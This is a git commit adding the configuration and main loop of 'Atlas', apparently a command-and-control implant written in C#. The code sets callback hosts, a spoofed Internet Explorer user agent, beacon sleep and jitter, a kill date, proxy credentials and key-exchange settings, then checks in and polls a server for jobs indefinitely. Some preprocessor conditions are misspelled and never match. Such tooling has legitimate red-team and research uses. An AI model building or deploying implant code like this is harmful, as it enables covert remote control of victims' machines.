a9be37d13122d03ed70e369a35df26d8e8af3851
airzero <29842352+airzero24@users.noreply.github.com>
2020-03-06 08:24:40 -0800

    Add files via upload

---
+++ Atlas/Atlas/Config.cs
@@ -0,0 +1,37 @@
+﻿#define DEFAULT_EKE
+
+using System.Collections.Generic;
+
+namespace Atlas
+{
+    public class Config
+    {
+        public static List<string> CallbackHosts = new List<string> { "http://127.0.0.1:9000" };
+        public static List<Utils.Server> Servers = new List<Utils.Server> { };
+        public static string PayloadUUID = "";
+        public static string UUID = "";
+        public static string UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
+        public static string HostHeader = "";
+        public static int Sleep = 5;
+        public static int Jitter = 35;
+        public static string KillDate = "";
+        public static string Param = "id";
+        public const int ChunkSize = 512000;
+        public static bool DefaultProxy = true;
+        public static string ProxyAddress = "";
+        public static string ProxyUser = "";
+        public static string ProxyPassword = "";
+#if (DEFAULT || DEFULAT_PSK || DEFAULT_EKE)
+        public static string Url = "/api/v1.4/agent_message";
+#endif
+#if (Default_PSK || DEFAULT_EKE)
+        public static string Psk = "";
+#endif
+#if DEFAULT_EKE
+        public static string SessionId = "";
+        public static string tempUUID = "";
+        public static System.Security.Cryptography.RSACryptoServiceProvider Rsa;
+#endif
+        public static Dictionary<string, string> Modules = new Dictionary<string, string>();
+    }
+}
---
+++ Atlas/Atlas/Program.cs
@@ -0,0 +1,27 @@
+﻿using System;
+namespace Atlas
+{
+    class Program
+    {
+        public static void Main(string[] args)
+        {
+            Utils.GetServers();
+            while (!Http.CheckIn())
+            {
+                int Dwell = Utils.GetDwellTime();
+                System.Threading.Thread.Sleep(Dwell);
+            }
+            Utils.JobList JobList = new Utils.JobList
+            {
+                job_count = 0,
+                jobs = { }
+            };
+            while (true)
+            {
+                Utils.Loop(JobList);
+                int Dwell = Utils.GetDwellTime();
+                System.Threading.Thread.Sleep(Dwell);
+            }
+        }
+    }
+}
